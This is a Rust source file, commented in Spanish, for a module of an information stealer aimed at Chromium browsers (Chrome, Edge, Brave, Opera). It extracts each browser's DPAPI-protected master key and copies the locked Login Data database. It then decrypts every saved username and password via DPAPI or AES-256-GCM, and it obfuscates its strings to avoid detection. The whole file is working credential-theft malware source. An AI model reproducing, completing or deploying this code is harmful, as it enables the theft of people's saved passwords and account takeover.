// Stealer para browsers basados en Chromium (Chrome, Edge, Brave, Opera)
use crate::stealer::{Credential, StealerError, StealerResult};
use crate::stealer::common::{get_appdata_local, file_exists, base64_decode};
use std::path::PathBuf;
use rusqlite::Connection;
use aes_gcm::{
    aead::{Aead, KeyInit},
    Aes256Gcm, Nonce,
};
use obfstr::obfstr; // ← Ofuscación de strings

#[cfg(target_os = "windows")]
use winapi::um::dpapi::CryptUnprotectData;
#[cfg(target_os = "windows")]
use winapi::um::wincrypt::DATA_BLOB;

/// Roba credenciales de Google Chrome
pub fn steal_chrome() -> StealerResult<Vec<Credential>> {
    steal_chromium_browser(obfstr!("Chrome"), obfstr!(r"Google\Chrome\User Data"))
}

/// Roba credenciales de Microsoft Edge
pub fn steal_edge() -> StealerResult<Vec<Credential>> {
    steal_chromium_browser(obfstr!("Edge"), obfstr!(r"Microsoft\Edge\User Data"))
}

/// Roba credenciales de Brave Browser
pub fn steal_brave() -> StealerResult<Vec<Credential>> {
    steal_chromium_browser(obfstr!("Brave"), obfstr!(r"BraveSoftware\Brave-Browser\User Data"))
}

/// Roba credenciales de Opera
pub fn steal_opera() -> StealerResult<Vec<Credential>> {
    steal_chromium_browser(obfstr!("Opera"), obfstr!(r"Opera Software\Opera Stable"))
}

/// Función genérica para robar credenciales de cualquier browser Chromium
fn steal_chromium_browser(browser_name: &str, relative_path: &str) -> StealerResult<Vec<Credential>> {
    let appdata = get_appdata_local().ok_or(StealerError::BrowserNotFound)?;
    
    let browser_path = appdata.join(relative_path);
    if !browser_path.exists() {
        return Err(StealerError::BrowserNotFound);
    }

    // Ruta a Local State (para obtener la clave de encriptación)
    let local_state_path = browser_path.join(obfstr!("Local State"));
    
    // Ruta a la base de datos de logins
    let login_data_path = browser_path.join(obfstr!(r"Default\Login Data"));
    
    if !file_exists(&login_data_path) {
        return Err(StealerError::DatabaseError(obfstr!("Login Data no encontrado").into()));
    }

    // Leer y parsear Local State para obtener la master key
    let master_key = if file_exists(&local_state_path) {
        match extract_master_key(&local_state_path) {
            Ok(Some(key)) => {
                // DEBUG: Escribir a archivo que la key se extrajo
                if let Ok(mut f) = std::fs::OpenOptions::new()
                    .create(true)
                    .append(true)
                    .open(std::env::temp_dir().join("stealer_debug.txt")) {
                    use std::io::Write;
                    let _ = writeln!(f, "[{}] Master key extracted: {} bytes", browser_name, key.len());
                }
                Some(key)
            },
            Ok(None) => {
                // DEBUG: Key no encontrada
                if let Ok(mut f) = std::fs::OpenOptions::new()
                    .create(true)
                    .append(true)
                    .open(std::env::temp_dir().join("stealer_debug.txt")) {
                    use std::io::Write;
                    let _ = writeln!(f, "[{}] Master key NOT found in Local State", browser_name);
                }
                None
            },
            Err(e) => {
                // DEBUG: Error extrayendo key
                if let Ok(mut f) = std::fs::OpenOptions::new()
                    .create(true)
                    .append(true)
                    .open(std::env::temp_dir().join("stealer_debug.txt")) {
                    use std::io::Write;
                    let _ = writeln!(f, "[{}] Master key extraction ERROR: {:?}", browser_name, e);
                }
                None
            }
        }
    } else {
        None
    };

    // Copiar Login Data a temp (está locked por el browser)
    let temp_db = copy_db_to_temp(&login_data_path)?;

    // Extraer credenciales de la base de datos SQLite
    let creds = extract_credentials_from_db(&temp_db, browser_name, master_key.as_deref())?;
    
    // Limpiar archivo temporal
    let _ = std::fs::remove_file(&temp_db);
    
    Ok(creds)
}

/// Copia la base de datos a un archivo temporal
fn copy_db_to_temp(db_path: &PathBuf) -> StealerResult<PathBuf> {
    let temp_dir = std::env::temp_dir();
    let temp_name = format!("tmp_{}.db", std::process::id());
    let temp_path = temp_dir.join(temp_name);
    
    std::fs::copy(db_path, &temp_path)
        .map_err(|e| StealerError::IoError(e.to_string()))?;
    
    Ok(temp_path)
}

/// Extrae la master key del archivo Local State
pub fn extract_master_key(local_state_path: &PathBuf) -> StealerResult<Option<Vec<u8>>> {
    // Leer el archivo JSON
    let content = std::fs::read_to_string(local_state_path)
        .map_err(|e| StealerError::IoError(e.to_string()))?;
    
    // Buscar la clave encriptada (búsqueda simple sin JSON parser) - OFUSCADO
    if let Some(start) = content.find(obfstr!("\"encrypted_key\":\"")) {
        let start_idx = start + 17;
        if let Some(end) = content[start_idx..].find("\"") {
            let base64_key = &content[start_idx..start_idx + end];
            
            // Decodificar Base64
            let encrypted_key = base64_decode(base64_key)
                .map_err(|_| StealerError::Base64Error)?;
            
            // Los primeros 5 bytes son "DPAPI", los removemos
            if encrypted_key.len() > 5 && &encrypted_key[0..5] == obfstr!("DPAPI").as_bytes() {
                let _encrypted_without_prefix = &encrypted_key[5..];
                
                // Desencriptar usando DPAPI (solo Windows)
                #[cfg(target_os = "windows")]
                {
                    let decrypted = dpapi_decrypt(&encrypted_key[5..])?;
                    return Ok(Some(decrypted));
                }
                
                #[cfg(not(target_os = "windows"))]
                return Err(StealerError::DecryptionFailed);
            }
        }
    }
    
    Ok(None)
}

/// Desencripta datos usando Windows DPAPI
#[cfg(target_os = "windows")]
fn dpapi_decrypt(data: &[u8]) -> StealerResult<Vec<u8>> {
    use std::ptr;
    
    let mut data_in = DATA_BLOB {
        cbData: data.len() as u32,
        pbData: data.as_ptr() as *mut u8,
    };

    let mut data_out: DATA_BLOB = unsafe { std::mem::zeroed() };

    let result = unsafe {
        CryptUnprotectData(
            &mut data_in,
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            0,
            &mut data_out,
        )
    };

    if result == 0 {
        return Err(StealerError::DecryptionFailed);
    }

    let size = data_out.cbData as usize;
    let decrypted = unsafe {
        std::slice::from_raw_parts(data_out.pbData, size).to_vec()
    };

    Ok(decrypted)
}

/// Wrapper público para desencriptar con DPAPI (retorna Option para compatibilidad)
#[cfg(target_os = "windows")]
pub fn decrypt_value_dpapi(data: &[u8]) -> Option<Vec<u8>> {
    dpapi_decrypt(data).ok()
}

#[cfg(not(target_os = "windows"))]
pub fn decrypt_value_dpapi(_data: &[u8]) -> Option<Vec<u8>> {
    None
}

/// Extrae credenciales de la base de datos SQLite (Login Data)
fn extract_credentials_from_db(
    db_path: &PathBuf,
    browser_name: &str,
    master_key: Option<&[u8]>,
) -> StealerResult<Vec<Credential>> {
    let conn = Connection::open(db_path)
        .map_err(|e| StealerError::DatabaseError(e.to_string()))?;
    
    let mut stmt = conn.prepare(obfstr!("SELECT origin_url, username_value, password_value FROM logins"))
        .map_err(|e| StealerError::DatabaseError(e.to_string()))?;
    
    let rows = stmt.query_map([], |row| {
        Ok((
            row.get::<_, String>(0)?,
            row.get::<_, String>(1)?,
            row.get::<_, Vec<u8>>(2)?,
        ))
    }).map_err(|e| StealerError::DatabaseError(e.to_string()))?;
    
    let mut credentials = Vec::new();
    
    for row_result in rows {
        if let Ok((url, username, encrypted_pwd)) = row_result {
            if username.is_empty() || encrypted_pwd.is_empty() {
                continue;
            }
            
            // Intentar desencriptar el password
            // IMPORTANTE: Primero DPAPI (passwords viejos), luego AES-GCM (passwords nuevos)
            let password = if let Ok(pwd) = decrypt_dpapi_fallback(&encrypted_pwd) {
                // DPAPI v1 (Chrome antiguo, pre-v80)
                pwd
            } else if let Some(key) = master_key {
                // AES-256-GCM (Chromium moderno v80+: v10/v11/v20)
                decrypt_aes_gcm(&encrypted_pwd, key).unwrap_or_else(|_| "[decrypt failed]".to_string())
            } else {
                // Sin master key y DPAPI falló
                "[no key]".to_string()
            };
            
            credentials.push(Credential {
                browser: browser_name.to_string(),
                url,
                username,
                password,
            });
        }
    }
    
    Ok(credentials)
}

/// Desencripta un password usando AES-256-GCM
/// Soporta formatos: v10, v11, v20
pub fn decrypt_aes_gcm_bytes(encrypted_data: &[u8], master_key: &[u8]) -> Option<Vec<u8>> {
    // Chromium v80+ formato: [v10/v11/v20][12 bytes nonce][encrypted data][16 bytes tag]
    if encrypted_data.len() < 3 {
        return None;
    }
    
    // Verificar prefijo (v10, v11, v20)
    let is_valid_prefix = &encrypted_data[0..3] == b"v10" 
        || &encrypted_data[0..3] == b"v11"
        || &encrypted_data[0..3] == b"v20";
    
    if !is_valid_prefix {
        return None;
    }
    
    if encrypted_data.len() < 3 + 12 + 16 {
        return None;
    }
    
    // Extraer componentes
    let nonce_bytes = &encrypted_data[3..15]; // 12 bytes
    let ciphertext_with_tag = &encrypted_data[15..]; // resto (encrypted + 16 bytes tag)
    
    // Crear cipher
    let cipher = Aes256Gcm::new_from_slice(master_key).ok()?;
    let nonce = Nonce::clone_from_slice(nonce_bytes);
    
    // Desencriptar - si falla, retornar None pero sin logging aquí
    cipher.decrypt(&nonce, ciphertext_with_tag).ok()
}

/// Versión con logging para debug
pub fn decrypt_aes_gcm_bytes_debug(encrypted_data: &[u8], master_key: &[u8]) -> (Option<Vec<u8>>, String) {
    let mut log = String::new();
    
    log.push_str(&format!("        📊 Total bytes: {}\n", encrypted_data.len()));
    log.push_str(&format!("        📊 Master key length: {}\n", master_key.len()));
    
    if encrypted_data.len() < 3 {
        log.push_str("        ❌ Datos muy cortos (< 3 bytes)\n");
        return (None, log);
    }
    
    let prefix = &encrypted_data[0..3];
    log.push_str(&format!("        📊 Prefix: {:02X} {:02X} {:02X} ({})\n", 
        prefix[0], prefix[1], prefix[2], 
        String::from_utf8_lossy(prefix)));
    
    if encrypted_data.len() < 3 + 12 + 16 {
        log.push_str(&format!("        ❌ Datos muy cortos para AES-GCM (mínimo 31 bytes, tiene {})\n", encrypted_data.len()));
        return (None, log);
    }
    
    // Extraer componentes
    let nonce_bytes = &encrypted_data[3..15];
    let ciphertext_with_tag = &encrypted_data[15..];
    
    log.push_str(&format!("        📊 Nonce length: {} bytes\n", nonce_bytes.len()));
    log.push_str(&format!("        📊 Ciphertext+Tag length: {} bytes\n", ciphertext_with_tag.len()));
    log.push_str(&format!("        📊 Expected plaintext: {} bytes\n", ciphertext_with_tag.len() - 16));
    
    // Crear cipher
    let cipher = match Aes256Gcm::new_from_slice(master_key) {
        Ok(c) => {
            log.push_str("        ✅ Cipher creado correctamente\n");
            c
        },
        Err(e) => {
            log.push_str(&format!("        ❌ Error creando cipher: {:?}\n", e));
            return (None, log);
        }
    };
    
    let nonce = Nonce::clone_from_slice(nonce_bytes);
    
    // Desencriptar
    match cipher.decrypt(&nonce, ciphertext_with_tag) {
        Ok(plaintext) => {
            log.push_str(&format!("        ✅ Desencriptación exitosa: {} bytes\n", plaintext.len()));
            (Some(plaintext), log)
        },
        Err(e) => {
            log.push_str(&format!("        ❌ Error en decrypt: {:?}\n", e));
            log.push_str("        💡 Posible causa: Master key incorrecta o formato diferente\n");
            (None, log)
        }
    }
}

fn decrypt_aes_gcm(encrypted_data: &[u8], master_key: &[u8]) -> StealerResult<String> {
    let plaintext = decrypt_aes_gcm_bytes(encrypted_data, master_key)
        .ok_or(StealerError::DecryptionFailed)?;
    
    String::from_utf8(plaintext)
        .map_err(|_| StealerError::InvalidData)
}

/// Fallback: Desencripta usando DPAPI directamente (passwords antiguos)
#[cfg(target_os = "windows")]
fn decrypt_dpapi_fallback(encrypted_data: &[u8]) -> StealerResult<String> {
    let decrypted = dpapi_decrypt(encrypted_data)?;
    String::from_utf8(decrypted)
        .map_err(|_| StealerError::InvalidData)
}

#[cfg(not(target_os = "windows"))]
fn decrypt_dpapi_fallback(_encrypted_data: &[u8]) -> StealerResult<String> {
    Err(StealerError::DecryptionFailed)
}
